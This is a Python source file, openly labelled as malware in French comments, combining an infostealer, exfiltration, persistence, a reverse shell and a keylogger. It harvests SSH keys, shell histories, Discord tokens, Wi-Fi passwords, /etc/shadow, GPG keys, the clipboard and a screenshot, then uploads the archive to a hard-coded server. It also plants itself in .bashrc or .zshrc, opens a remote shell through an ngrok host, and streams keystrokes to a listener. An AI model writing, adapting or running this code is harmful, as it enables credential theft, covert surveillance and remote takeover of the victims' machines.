import os
import pynput.keyboard
import shutil
import platform
import socket
import psutil
import getpass
import subprocess
import threading
import requests
import json
import re
import sqlite3
import tempfile
import pyperclip
import time
from pathlib import Path
from datetime import datetime
from PIL import ImageGrab

OUTPUT_DIR = Path("info_logs")
OUTPUT_DIR.mkdir(exist_ok=True)

def write_result(name, content):
    with open(OUTPUT_DIR / f"{name}.txt", "w", encoding="utf-8") as f:
        f.write(content if isinstance(content, str) else str(content))

def run_cmd(cmd):
    try:
        return subprocess.check_output(cmd, shell=True, text=True, stderr=subprocess.DEVNULL).strip()
    except Exception as e:
        return f"Command failed : {e}"

def get_platform():
    return platform.system().lower()

PLATFORM = get_platform()
HOME = Path.home()



# ========== PARTIE 1 : COLLECTE D'INFOS ==========

class CollectInfo:
    def __init__(self):
        print("[+] Début de la collecte d'infos...")

        print("History info...")
        self.history_info()

        print("CPU RAM DISK info...")
        self.cpu_ram_disk_info()

        print("Config info...")
        self.config_info()

        print("Collecting environment variables...")
        self.env_info()

        print("Installed packages...")
        self.installed_packages()

        print("IP info...")
        self.ip_info()

        print("Network info...")
        self.network_info()

        print("Ports info...")
        self.ports_info()

        print("Process info...")
        self.process_info()

        print("Recent files...")
        self.recent_files()

        print("Services info...")
        self.services_info()

        print("Collecting SSH keys...")
        self.ssh_keys()

        print("SSL certs...")
        self.ssl_certs()

        print("Collecting system information...")
        self.system_info()

        print("Users and groups info...")
        self.users_groups_info()

        print("Firewall info...")
        self.firewall_info()

        print("Datetime info...")
        self.datetime_info()

        print("2nd collect of system info...")
        self.system_info2()

        print("BIOS info...")
        self.bios_info()

        print("Collecting user id's...")
        self.user_ids()

        print("Collecting scheduled tasks...")
        self.scheduled_tasks()

        print("Trying to collect discord tokens...")
        self.find_discord_tokens()

        print("Collecting Wi-Fi passwords...")
        self.wifi_passwords()

        print("Browser extensions info...")
        self.browser_extensions()

        print("Collecting sensitive files...")
        self.sensitive_files()

        print("Trying to get the user hashes...")
        self.user_hashes()

        print("Getting /etc/passwd...")
        self.etc_passwd()

        print("Directories from the root directory infos...")
        self.dirs_from_the_root_dir()

        print("Collecting working directory (pwd)...")
        self.pwd_info()
        
        print("Trying to collect /var/www/html...")
        self.var_www_html()

        print("Privileged groups info...")
        self.privileged_groups()

        print("Getting secure boot status...")
        self.secure_boot_status()

        print("Getting tmp status...")
        self.tmp_status()

        print("Kernel modules info...")
        self.kernel_modules()

        print("Running containers info...")
        self.running_containers()

        print("Large files info...")
        self.large_files()

        print("SUID & SGID files info...")
        self.suid_sgid_files()

        print("Public perms info...")
        self.public_perms()

        print("Collecting DNS settings...")
        self.dns_settings()

        print("Collecting proxy settings...")
        self.proxy_settings()

        print("Getting the hosts file...")
        self.hosts_file()

        print("Collecting all executables in the system...")
        self.find_executables()

        print("Last logins info...")
        self.last_logins()

        print("Collecting screenlock settings...")
        self.screenlock_settings()

        print("Collecting active sessions...")
        self.active_sessions()

        print("Getting clipboard...")
        self.get_clipboard()

        print("Taking a screenshot...")
        self.take_screenshot()

        print(f"\n[+] Collecte terminée ! Tous les fichiers sont dans {OUTPUT_DIR} !\n\n")

    
    def history_info(self):
        bash_path = (HOME / ".bash_history")
        zsh_path = (HOME / ".zsh_history")
        powershell = (HOME / "AppData/Roaming/Microsoft/Windows/Powershell/PSReadline/ConsoleHost_history.txt")

        if bash_path.exists():
            write_result("bash_history", bash_path.read_text(errors="ignore"))
        if zsh_path.exists():
            write_result("zsh_history", zsh_path.read_text(errors="ignore"))
        if PLATFORM == "windows" and powershell.exists():
            write_result("powershell_history", powershell.read_text(errors="ignore"))
    
    def cpu_ram_disk_info(self):
        content = f"""CPU Count : {psutil.cpu_count()}
CPU Freq : {psutil.cpu_freq()}
RAM : {psutil.virtual_memory()}
SWAP : {psutil.swap_memory()}
"""
        disks = ""
        for part in psutil.disk_partitions():
            try:
                usage = psutil.disk_usage(part.mountpoint)
                disks += f"\nMount : {part.mountpoint}\n{usage}\n"
            except:
                continue
        
        content += f"\nDisk Usage :\n{disks}"
        write_result("cpu_ram_disk", content)
    
    def config_info(self):
        if PLATFORM == "linux":
            config_dir = HOME / ".config"
            config_dump = ""
            if config_dir.exists():
                for path in config_dir.rglob("*"):
                    if path.is_file() and path.stat().st_size < 50000:
                        try:
                            config_dump += f"\n=== {path} ===\n{path.read_text(errors="ignore")}\n"
                        except:
                            continue
            
            write_result("dot_config", config_dump)

    def env_info(self):
        write_result("env_variables", "\n".join(f"{k}={v}" for k, v in os.environ.items()))

    def installed_packages(self):
        if PLATFORM == "linux":
            pkgs = run_cmd("dpkg -l") or run_cmd("rpm -qa")
        else:
            pkgs = run_cmd("powershell -Command Get-Package")
        write_result("installed_packages", pkgs)

    def ip_info(self):
        local_ip = socket.gethostbyname(socket.gethostname())
        external_ip = run_cmd("curl -s ifconfig.me") or run_cmd("powershell -Command Invoke-RestMethod ifconfig.me")
        info = f"Local IP : {local_ip}\nExternal IP : {external_ip}"
        write_result("ip_info", info)
    
    def network_info(self):
        if_addrs = psutil.net_if_addrs()
        net_info = ""
        for iface, addrs in if_addrs.items():
            net_info += f"\nInterface : {iface}\n"
            for addr in addrs:
                net_info += f"{addr}\n"
        conns = "\n".join([str(conn) for conn in psutil.net_connections()])
        write_result("network_interfaces", net_info)
        write_result("network_connections", conns)

    def ports_info(self):
        if PLATFORM == "linux":
            data = run_cmd("ss -tuln")
        else:
            data = run_cmd("netstat -an | findstr LISTENING")
        write_result("open_ports", data)
    
    def process_info(self):
        processes = ""
        for p in psutil.process_iter(['pid', 'name', 'exe', 'username', 'status']):
            try:
                processes += f"{p.info}\n"
            except:
                continue
        write_result("processes", processes)
    
    def recent_files(self):
        recent = ""
        for root, dirs, files in os.walk(str(HOME)):
            for name in files:
                try:
                    path = Path(root) / name
                    if path.stat().st_mtime > (datetime.now().timestamp() - 7 * 86400):
                        recent += f"{path}\n"
                except:
                    continue
        write_result("recent_files", recent)
    
    def services_info(self):
        if PLATFORM == "linux:":
            data = run_cmd("systemctl list-units --type=service --state=running --no-pager")
        else:
            data = run_cmd("powershell -Command Get-Service | Where-Object {$_.Status -eq 'Running'}")
        write_result("services", data)
    
    def ssh_keys(self):
        ssh_dump = ""
        ssh_dir = HOME / ".ssh"
        if ssh_dir.exists():
            for f in ssh_dir.glob("*"):
                try:
                    ssh_dump += f"\n=== {f.name} ===\n{f.read_text(errors='ignore')}"
                except:
                    continue
        write_result("ssh_keys", ssh_dump)
    
    def ssl_certs(self):
        if PLATFORM == "linux":
            certs = ""
            for cert in Path("/etc/ssl").rglob("*.pem"):
                try:
                    certs += f"\n=== {cert} ===\n{cert.read_text(errors='ignore')}"
                except:
                    continue
            write_result("ssl_certs", certs)
        elif PLATFORM == "windows":
            certs = run_cmd('powershell -Command "Get-ChildItem -Path Cert:\\LocalMachine\\My | Format-List')
            write_result("ssl_certs", certs)
    
    def system_info(self):
        info = f"""Hostname : {socket.gethostname()}
Username : {getpass.getuser()}
Platform : {platform.system()}
Release : {platform.release()}
Version : {platform.version()}
Architecture : {platform.machine()}
Processor : {platform.processor()}
Kernel : {run_cmd('uname -a') if PLATFORM == 'linux' else platform.version()}
"""
        write_result("system_info", info)
    
    def users_groups_info(self):
        if PLATFORM == "linux":
            users = run_cmd("cut -d: -f1 /etc/passwd")
            groups = run_cmd("cut -d: -f1 /etc/group")
        else:
            users = run_cmd("net user")
            groups = run_cmd("net localgroup")
        write_result("users", users)
        write_result("groups", groups)
    
    def firewall_info(self):
        if PLATFORM == "linux":
            status = run_cmd("ufw status") or run_cmd("iptables -L")
        else:
            status = run_cmd("netsh advfirewall show allprofiles")
            write_result("firewall", status)
    
    def datetime_info(self):
        write_result("datetime", str(datetime.now()))
    
    def system_info2(self):
        info = {
            "OS": platform.system(),
            "OS Version": platform.version(),
            "Architecture": platform.machine(),
            "Hostname": socket.gethostname(),
            "IP Address": socket.gethostbyname(socket.gethostname()),
            "CPU": platform.processor(),
            "User": os.getlogin()
        }
        write_result("system_info2", info)

    def bios_info(self):
        if PLATFORM == "linux":
            data = run_cmd("sudo dmidecode -t bios")
        elif PLATFORM == "windows":
            data = run_cmd('wmic bios get Manufacturer,Version,SMBIOSBIOSVersion,ReleaseDate')
        else:
            data = "Unsupported"
        write_result("bios_info", data)

    def user_ids(self):
        if PLATFORM == "linux":
            uid = os.getuid()
            gid = os.getgid()
            data = f"UID: {uid}\nGID: {gid}"
        else:
            data = run_cmd("whoami /user")
        write_result("user_ids", data)

    def scheduled_tasks(self):
        if PLATFORM == "linux":
            cron = run_cmd("crontab -l")
            system_cron = run_cmd("cat /etc/crontab")
            data = f"User crontab :\n{cron}\n\nSystem crontab :\n{system_cron}"
        else:
            data = run_cmd("schtasks /query /fo LIST /v")
        write_result("scheduled_tasks", data)

    def find_discord_tokens(self):
        token_list = []
        paths = []

        if PLATFORM == "windows":
            paths.append(HOME / "AppData/Roaming/Discord/Local Storage/leveldb")
        else:
            paths.append(HOME / ".config/discord/Local Storage/leveldb")
        
        for path in paths:
            if path.exists():
                for file in path.glob("*.ldb"):
                    try:
                        content = file.read_text(errors='ignore')
                        tokens = [line for line in content.splitlines() if "mfa." in line or "==" in line]
                        token_list += tokens
                    except:
                        continue
        
        write_result("discord_tokens", "\n".join(token_list) if token_list else "No tokens found.")

    def wifi_passwords(self):
        content = ""
        if PLATFORM == "windows":
            # Windows : utilise netsh pour lister profils et mots de passe
            profiles = run_cmd("netsh wlan show profiles")
            profile_names = re.findall(r"All User Profile\s*:\s*(.*)", profiles)
            for name in profile_names:
                name = name.strip()
                pwd = run_cmd(f'netsh wlan show profiles name="{name}" key=clear')
                pwd_search = re.search(r"Key Content\s*:\s*(.*)", pwd)
                password = pwd_search.group(1) if pwd_search else "No password found"
                content += f"SSID : {name}\nPassword : {password}\n\n"
        elif PLATFORM == "linux":
            # Linux : lire /etc/NetworkManager/system-connections/ (permissions root souvent requises)
            nm_path = Path("/etc/NetworkManager/system-connections")
            if nm_path.exists():
                for f in nm_path.iterdir():
                    if f.is_file():
                        try:
                            text = f.read_text(errors='ignore')
                            ssid_search = re.search(r"ssid=(.*)", text)
                            psk_search = re.search(r"psk=(.*)", text)
                            ssid = ssid_search.group(1).strip() if ssid_search else "Unknown SSID"
                            psk = psk_search.group(1).strip() if psk_search else "No password found"
                            content += f"SSID : {ssid}\nPassword : {psk}\n\n"
                        except Exception:
                            continue
            else:
                content = "NetworkManager profiles not found or permission denied."
        else:
            content = "Unsupported OS for Wi-Fi passwords extraction."
        write_result("wifi_passwords", content)

    def browser_extensions(self):
        content = ""

        # Chrome/Chromium
        if PLATFORM == "linux" or PLATFORM == "windows":
            if PLATFORM == "linux":
                base_path = HOME / ".config/google-chrome/Default/Extensions"
                if not base_path.exists():
                    base_path = HOME / ".config/chromium/Default/Extensions"
            else: # Windows
                base_path = Path(os.environ.get("LOCALAPPDATA", "")) / "Google/Chrome/User Data/Default/Extensions"
            if base_path.exists():
                for ext in base_path.iterdir():
                    manifest_file = ext / "manifest.json"
                    if manifest_file.exists():
                        try:
                            manifest = json.loads(manifest_file.read_text(encoding="utf-8"))
                            ext_name = manifest.get("name", "Unknown")
                            version = manifest.get("version", "Unknown")
                            content += f"Extension : {ext_name} (Version : {version})\n"
                            content += f"ID : {ext.name}\n\n"
                        except Exception:
                            continue
        

        # Firefox
        if PLATFORM == "linux" or PLATFORM == "windows":
            firefox_profiles = []
            if PLATFORM == "linux":
                ff_profiles_ini = HOME / ".mozilla/firefox/profiles.ini"
            else:
                ff_profiles_ini = Path(os.environ.get("APPDATA", "")) / "Mozilla/Firefox/profiles.ini"
            
            if ff_profiles_ini.exists():
                profiles_ini_content = ff_profiles_ini.read_text(errors='ignore')
                profile_paths = re.findall(r'Path=(.*)', profiles_ini_content)
                for path in profile_paths:
                    profile_dir = (ff_profiles_ini.parent / path).resolve()
                    extensions_json = profile_dir / "extensions.json"
                    if extensions_json.exists():
                        try:
                            extensions_data = json.loads(extensions_json.read_text(encoding="utf-8"))
                            addons = extensions_data.get("addons", [])
                            for addon in addons:
                                name = addon.get("name", "Unknown")
                                version = addon.get("version", "Unknown")
                                content += f"Firefox Extension : {name} (Version : {version})\n\n"
                        except Exception:
                            continue
        
        if not content:
            content = "No browser extensions found or paths do not exist."
        
        write_result("browser_extensions", content)
    
    def sensitive_files(self):
        sensitive_paths = [
            HOME / ".bashrc",
            HOME / ".zshrc",
            HOME / ".profile",
            HOME / ".ssh/config",
            HOME / ".gnupg/gpg.conf",
            HOME / ".gnupg/private-keys-v1.d",
            HOME / ".gitconfig",
            HOME / ".vimrc",
            HOME / ".config/autostart"
        ]

        content = ""

        for path in sensitive_paths:
            if path.exists():
                if path.is_file():
                    try:
                        content += f"\n=== {path} ===\n"
                        content += path.read_text(errors='ignore') + "\n"
                    except Exception:
                        continue
                elif path.is_dir():
                    for file in path.rglob("*"):
                        if file.is_file():
                            try:
                                content += f"\n=== {file} ===\n"
                                content += file.read_text(errors='ignore') + "\n"
                            except Exception:
                                continue
        
        if not content:
            content = "No sensitive files found."
        write_result("sensitive_files", content)
    
    def user_hashes(self):
        if PLATFORM == "linux":
            try:
                data = run_cmd("sudo cat /etc/shadow")
            except Exception as e:
                data = f"Can't read /etc/shadow : {e}"
        elif PLATFORM == "windows":
            try:
                data = run_cmd('powershell -Command \"Get-LocalUser | Format-List\"')
            except Exception as e:
                data = f"Can't read user hashes : {e}"
        else:
            data = "Unsupported"
        write_result("user_hashes", data)

    def etc_passwd(self):
        if PLATFORM == "linux":
            etc_passwd_file = Path("/etc/passwd")
            content = etc_passwd_file.read_text(errors='ignore')
        write_result("etc_passwd_file", content)

    def dirs_from_the_root_dir(self):
        content = ""

        if PLATFORM == "linux":    
            root_dir = Path("/")

            # ls /
            for item in root_dir.iterdir():
                content += f"{item}\n"

            content += "\n\n"

            # Subdirs
            for item in root_dir.iterdir():
                if item.is_dir():
                    if item in [Path("/root"), Path("/lost+found")]:
                        continue
                    try:
                        for sub_item in item.iterdir():
                            content += f"{item} : {sub_item}\n"
                    except PermissionError:
                        content += f"{item} : [Permission Denied]\n"
        
        write_result("DFTRD", content)

    def pwd_info(self): # À exécuter au début du script ? Pour savoir directement dans quel Path le fichier se trouve au mmoment de l'exécution ?
        if PLATFORM == "linux" or "windows":
            pwd_info = Path.cwd()
        write_result("pwd_info", pwd_info)

    def var_www_html(self):
        content = ""
        
        if PLATFORM == "linux":
            var_dir = Path("/var")
            var_www_dir = Path("/var/www")
            var_www_html_dir = Path("/var/www/html")

            # /var dir
            for item in var_dir.iterdir(): # Et si permission denied ? Rajouter un try avant for, et donc un except.
                content += f"{item}\n"
                if item.is_file():
                    try:
                        content += f"=== Content of file {item} ===\n{item.read_text(errors='ignore')}\n"
                    except Exception as e:
                        content += f"[---] Can't read content of file {item} : {e}"
            
            # /var/www
            for item in var_www_dir.iterdir(): # IDEM
                content += f"{item}\n"
                if item.is_file():
                    try:
                        content += f"=== Content of file {item} ===\n{item.read_text(errors='ignore')}\n"
                    except Exception as e:
                        content += f"[---] Can't read content of file {item} : {e}"

            # /var/www/html
            for item in var_www_html_dir.iterdir(): # IDEM
                content += f"{item}\n"
                if item.is_file():
                    try:
                        content += f"=== Content of file {item} ===\n{item.read_text(errors='ignore')}\n"
                    except Exception as e:
                        content += f"[---] Can't read content of file {item} : {e}"
        
    
    def privileged_groups(self):
        if PLATFORM == "linux":
            data = run_cmd("getent group sudo")
        else:
            data = run_cmd("powershell -Command Get-LocalGroupMember -Group 'Administrators'")
        write_result("privileged_groups", data)

    def secure_boot_status(self):
        if PLATFORM == "linux":
            data = run_cmd("mokutil --sb-state")
        else:
            data = run_cmd("powershell -Command Confirm-SecureBootUEFI")
        write_result("secure_boot", data)

    def tmp_status(self):
        if PLATFORM == "linux":
            data = run_cmd("tpm2_getcap properties-fixed")
        else:
            data = run_cmd("powershell -Command Get-WmiObject -Namespace 'Root\\CIMv2\\Security\\MicrosoftTpm' -Class Win32_Tpm")
        write_result("tpm_status", data)

    def kernel_modules(self):
        if PLATFORM == "linux":
            data = run_cmd("lsmod")
        else:
            data = "Not applicable on Windows."
        write_result("kernel_modules", data)

    def running_containers(self):
        data = run_cmd("docker ps -a") + "\n" + run_cmd("lxc list")
        write_result("containers", data)

    def large_files(self):
        if PLATFORM == "linux":
            data = run_cmd("find ~ -type f -size +100M 2>/dev/null")
        else:
            data = run_cmd("powershell -Command Get-Children -Path $env:USERPROFILE -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Lenght -gt 100MB} | Select-Object FullName,Lenght")
        write_result("large_files", data)

    def suid_sgid_files(self):
        if PLATFORM == "linux":
            data = run_cmd("find / -perm /6000 -type f 2>/dev/null")
        else:
            data = "Not applicable on Windows."
        write_result("suid_sgid_files", data)

    def public_perms(self):
        if PLATFORM == "linux":
            data = run_cmd("find / -perm -0002 -type f 2>/dev/null")
        else:
            data = run_cmd("powershell -Command Get-ChildItem -Path $env:USERPROFILE -Recurse -ErrorAction SilentlyContinue | Where-Object { ($_.Attributes -match 'Archive') -and ($_.GetAccessControl().Access | Where-Object { $_.FileSystemRights -match 'WriteData' -and $_.IdentityReference -match 'Everyone' }) }")
        write_result("world_writable_files", data)

    def dns_settings(self):
        if PLATFORM == "linux":
            data = run_cmd("cat /etc/resolv.conf")
        else:
            data = run_cmd("powershell -Command Get-DnsClientServerAddress")
        write_result("dns_settings", data)

    def proxy_settings(self):
        if PLATFORM == "linux":
            data = os.environ.get("http_proxy", "Not set") + "\n" + os.environ.get("https_proxy", "Not set")
        else:
            data = run_cmd('reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings" /v ProxyServer')
        write_result("proxy_settings", data)

    def hosts_file(self):
        path = Path("/etc/hosts") if PLATFORM == "linux" else Path("C:\Windows\System32\drivers\etc\hosts")
        if path.exists():
            try:
                data = path.read_text(errors='ignore')
            except:
                data = "Permission denied."
        else:
            data = "Hosts file not found."
        write_result("hosts_file", data)

    def find_executables(self):
        if PLATFORM == "linux":
            data = run_cmd("find / -type f -executable -print")
        write_result("executables", data)

    def last_logins(self):
        if PLATFORM == "linux":
            data = run_cmd("last -F | head -n 50")
        else:
            data = run_cmd("powershell -Command Get-EventLog -LogName Security -InstanceId 4624 -Newest 50 | Format-Table TimeGenerated,ReplacementStrings")
        write_result("last_logins", data)

    def screenlock_settings(self):
        if PLATFORM == "linux":
            data = run_cmd("gsettings get org.gnome.desktop.screensaver lock-enabled") + "\n"
            data += run_cmd("gsettings get org.gnome.desktop.session idle-delay")
        else:
            data = run_cmd("powershell -Command Get-ItemProperty -Path 'HKCU:\\Control Panel\\Desktop' | Select-Object ScreenSaveActive,ScreenSaverIsSecure,ScreenSaveTimeOut")
        write_result("screenlock", data)

    def active_sessions(self):
        if PLATFORM == "linux":
            data = run_cmd("who -a")
        else:
            data = run_cmd("query user")
        write_result("active_sessions", data)

    def get_clipboard(self):
        try:
            data = pyperclip.paste()
        except Exception as e:
            data = f"Error : {e}"
        write_result("clipboard", data)

    def take_screenshot(self):
        try:
            img = ImageGrab.grab()
            path = OUTPUT_DIR / "screenshot.png"
            img.save(path)
        except Exception as e:
            write_result("screenshot_error", f"Screenshot failed : {str(e)}")

    


    





    
            
                    
            
            



    
            
    
    



    
    
    

    
    

    


    


# ========== PARTIE 2 : SEND TO SERVER ==========

def send_to_server():

    print("[+] Dossier de collecte d'infos en cours d'envoi...")

    # Zip le dossier
    archive_name = Path("logs.zip")
    shutil.make_archive(archive_name.stem, "zip", OUTPUT_DIR.as_posix())


    # Envoi
    try:
        with archive_name.open("rb") as f:
            res = requests.post("http://192.168.1.9:8080/upload", files={"file": f})
            print(f"[+] Envoi au serveur : {res.status_code}, {res.text}")
    except Exception as e:
        print(f"[-] Échec de l'envoi : {e}")

    # Essayer de supprimer l'archive localement
    try:
        archive_name.unlink()
        print("[+] Archive supprimée localement.")
    except Exception as e:
        print(f"[-] Impossible de supprimer l'archive : {e}")


# ========== PARTIE 3 : ADD PERSISTENCE ==========

def add_persistence():
    print("[+] Démarrage de la persistence...")

    if PLATFORM == "linux":
        hidden_path = HOME / ".local" / ".hidden_malware22"
    
        try:
            shutil.copyfile(__file__, hidden_path)
            print(f"[+] Malware copié --> ~/.local/.hidden_malware22.py")
        except Exception as e:
            print(f"[-] Erreur de copie : {e}")

        shell_used = run_cmd("echo $SHELL")
        bashrc_path = HOME / ".bashrc"
        zshrc_path = HOME / ".zshrc"
        exec_line = f"python3 {hidden_path}\n"

        if "bash" in str(shell_used):
            if bashrc_path.exists():
                with open(bashrc_path, 'r') as f:
                    lines = f.readlines()
                if exec_line not in lines:
                    with open(bashrc_path, 'a') as f:
                        f.write(f"\n# Auto-run malware\n{exec_line}")
                    print("[+] Persistence ajoutée dans ~/.bashrc")
                else:
                    print("[=] Persistence déjà mise en place")
            else:
                print("[-] ~/.bashrc introuvable !")
        
        elif "zsh" in str(shell_used):
            if zshrc_path.exists():
                with open(zshrc_path, 'r') as f:
                    lines = f.readlines()
                if exec_line not in lines:
                    with open(zshrc_path, 'a') as f:
                        f.write(f"\n#Auto-run malware\n{exec_line}")
                    print("[+] Persistence ajoutée dans ~/.zshrc")
                else:
                    print("[=] Persistence déjà mise en place")

            else:
                print("[-] ~/.zshrc introuvable !")
        
        else:
            print("[-] Impossible de mettre la persistence : shell inconnu...")
    

    
            
    
    
    


# ========== PATIE 4 : REVERSE SHELL INTELLIGENT ==========

def smart_reverse_shell():
    s = socket.socket()
    host = '6.tcp.eu.ngrok.io' # Remplacer par l'adresse TCP fournie par ngrok
    port = 13790 # Remplacer par le port TCP fourni par ngrok
    s.connect((host, port))


    while True:
        data = s.recv(1024)
        if data[:2].decode("utf-8") == 'cd': # 2 premières lettres
            os.chdir(data[3:].decode("utf-8")) # Après 3 premières lettres
        if len(data) > 0:
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes, "utf-8")
            s.send(str.encode(output_str + str(os.getcwd())))
            print(output_str)


    # Close connection
    s.close()



# ========== PARTIE 5 : KEYLOGGER INTELLIGENT ==========

class SmartKeylogger:
    def __init__(self, server_ip, interval=30):
        self.log = ""
        self.interval = interval
        self.server_url = f"http://{server_ip}:5555/keylog"
        self.listener = pynput.keyboard.Listener(on_press=self.on_press)
        self.thread = threading.Thread(target=self.report)
        self.thread.daemon = True

    def on_press(self, key):
        try:
            self.log += key.char
        except:
            if key == pynput.keyboard.Key.space:
                self.log += " "
            elif key == pynput.keyboard.Key.enter:
                self.log += "\n"
            else:
                self.log += f" <{key.name}> "

    def report(self):
        while True:
            if self.log:
                try:
                    requests.post(self.server_url, data=self.log, timeout=5)
                    print("[+] Keylog envoyé.")
                    self.log = ""
                except Exception as e:
                    print(f"[-] Erreur d'envoi keylog : {e}")
            time.sleep(self.interval)

    def start(self):
        self.listener.start()
        self.thread.start()




if __name__ == "__main__":
    print("[ + ] Le malware a été lancé !")
    CollectInfo()
    send_to_server()
    add_persistence()
    
    # Lancer les fonctionnalités en parallèle
    keylogger = SmartKeylogger("192.168.1.9", 5)
    keylogger.start()

    shell_thread = threading.Thread(target=smart_reverse_shell)
    shell_thread.daemon = True
    shell_thread.start()

    while True:
        time.sleep(60)
    



